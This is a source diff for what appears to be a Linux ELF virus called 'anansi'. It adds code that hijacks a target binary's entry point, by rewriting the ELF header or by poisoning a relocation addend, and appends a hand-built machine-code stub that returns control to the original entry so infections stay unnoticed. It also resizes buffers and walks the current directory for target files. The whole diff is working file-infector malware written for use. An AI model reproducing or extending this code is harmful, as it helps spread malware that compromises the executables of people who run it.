@@ -40,6 +40,7 @@
 
 //misc macros
 #define RDRAND_BIT (1 << 30)
+#define EPILOG_SIZE 30
 
 typedef struct elfbin {
 	Elf64_Ehdr *ehdr;
@@ -59,11 +60,11 @@ typedef struct elfbin {
 	uint64_t vx_size;
 	uint8_t  *vx_start;
 
-	int pt_note_entry;
-	int text_seg_ndx;
-
 	uint64_t vx_vaddr;
 	uint64_t vx_offset;
+
+	int pt_note_entry;
+	int text_seg_ndx;
 
 	uint64_t desired_rela_offset;
 
@@ -73,6 +74,7 @@ extern unsigned long real_start;
 
 // functions unique to anansi
 int dispatch_infection(Elfbin *target);
+void append_ret_2_OEP_stub(uint8_t *insertion, Elfbin *target, uint64_t orig_entry);
 void pt_note_infect(Elfbin *target);
 bool has_R_X86_64_RELATIVE(Elfbin *target, Elf64_Rela *r);
 bool within_section(Elfbin *target, char *section, uint64_t addr);
@@ -168,6 +170,7 @@ int _start() {
 			"pop %rax\n"
 			"pop %rbp\n"
 			"pop %rsp\n"
+			"jmp end_code\n"
 			);
 }
 
@@ -186,8 +189,8 @@ void vx_main()
 	uint64_t vx_size = (uint8_t *)&end_vx - (uint8_t *)&real_start;
 
 	uint8_t *vx_start = (uint8_t *)get_eip() - ((uint8_t *)&foobar - (uint8_t *)&real_start); //calculates the address of vx_main
-	char test_msg[] = "Infection Time";
-	anansi_write(1, test_msg, anansi_strlen(test_msg));
+	char test_msg[] = "Infection Time\n";
+	anansi_write(1, test_msg, 15);
 
 #ifdef DEBUG
 	anansi_printf("vx_start @ 0x0%lx\n", vx_start);
@@ -211,7 +214,7 @@ void vx_main()
 	}
 
 	nread = anansi_getdents64(cwd_fd, cwd_listings, DIR_LISTING_SIZE);
-	d = (struct linux_dirent *)cwd_listings;
+	//d = (struct linux_dirent *)cwd_listings;
 	attr = PROCESS_ELF_EHDR | PROCESS_ELF_PHDR | PROCESS_ELF_SHDR;
 
 	target.vx_size = vx_size;
@@ -245,7 +248,6 @@ clean_up:
 		anansi_munmap(cwd, PATH_MAX);
 	if(cwd_listings != NULL)
 		anansi_munmap(cwd_listings, DIR_LISTING_SIZE);
-	anansi_exit(status);
 }
 
 int dispatch_infection(Elfbin *target)
@@ -254,6 +256,7 @@ int dispatch_infection(Elfbin *target)
 	Elf64_Rela *mod_reloc;
 	Elf64_Ehdr *hdr;
 	uint8_t *insertion;
+	uint64_t orig_entry;
 
 	char filename_append[] = ".0ut";
 
@@ -275,11 +278,15 @@ int dispatch_infection(Elfbin *target)
 
 	if(use_reloc_poison) {
 		mod_reloc = (Elf64_Rela *)(target->write_only_mem + target->desired_rela_offset);
+		orig_entry = mod_reloc->r_addend;
 		mod_reloc->r_addend = target->vx_vaddr;
 	}else {
 		hdr = (Elf64_Ehdr *)(target->write_only_mem);
+		orig_entry = hdr->e_entry; //backup original entry point
 		hdr->e_entry = target->vx_vaddr;
 	}
+
+	append_ret_2_OEP_stub(insertion, target, orig_entry);
 
 	size_t f_path_len = anansi_strlen(target->f_path);
 	char *v_name = anansi_malloc(f_path_len + 5);
@@ -305,6 +312,44 @@ int dispatch_infection(Elfbin *target)
 	return 0;
 }
 
+void append_ret_2_OEP_stub(uint8_t *insertion, Elfbin *target, uint64_t orig_entry)
+{
+	unsigned char epilog[EPILOG_SIZE];
+	unsigned int relative_call_len = 18;
+
+	unsigned char inst_two[] = "\x48\x2d";
+	unsigned char inst_three[] = "\x48\x05";
+	unsigned char inst_four[] = "\xff\xe0";
+	unsigned char inst_five[] = "\x48\x8b\x04\x24";
+	uint64_t stub_vx_size = target->vx_size + 5;
+	int vx_size_cpy = target->vx_size;
+	int vx_size_actual_len = 0;
+
+	do {
+		vx_size_cpy >>= 8;
+		vx_size_actual_len++;
+	} while(vx_size_cpy);
+
+
+	anansi_memset(epilog, 0x00, 30);
+	epilog[0] = 0xe8;
+	epilog[1] = relative_call_len + vx_size_actual_len;
+	anansi_memcpy(epilog + 5, inst_two, 2); //sub <vx_size>, %rax
+	anansi_memcpy(epilog + 7, &stub_vx_size, 4);
+
+	anansi_memcpy(epilog + 11, inst_two, 2); //sub <vx_start>, %rax
+	anansi_memcpy(epilog + 13, &target->vx_vaddr, 4);
+
+	anansi_memcpy(epilog + 17, inst_three, 2); //add <e_entry>, %rax
+	anansi_memcpy(epilog + 19, &orig_entry, 4);
+
+	anansi_memcpy(epilog + 23, inst_four, 2); //jmp rax
+
+	anansi_memcpy(epilog + 25, inst_five, 4); // mov rax, [rsp] #get_eip relative call enters here
+	anansi_memcpy(epilog + 29, "\xc3", 1 ); // ret
+
+	anansi_memcpy(insertion + target->vx_size, epilog, 30);
+}
 
 void pt_note_infect(Elfbin *target)
 {
@@ -555,11 +600,11 @@ int process_elf(Elfbin *target, int attr, int perm, int len)
 	}
 
 	if(perm & PROCESS_ELF_O_RDWR) {
-		target->write_only_mem = anansi_malloc(fs.st_size + len);
+		target->write_only_mem = anansi_malloc(fs.st_size + len + EPILOG_SIZE);
 		if(target->write_only_mem == NULL)
 			return -1;
 		anansi_memcpy(target->write_only_mem, target->read_only_mem, fs.st_size);
-		target->new_size = fs.st_size + len;
+		target->new_size = fs.st_size + len + EPILOG_SIZE;
 	}
 
 	if(attr & PROCESS_ELF_EHDR) {
@@ -1166,7 +1211,7 @@ unsigned long get_eip() {
 		"pop %rax\n");
 }
 
-void end_code() {
+__attribute__((naked)) void end_code() {
 	asm(".globl end_vx\n"
 		"end_vx:\n"
 		"nop\n");
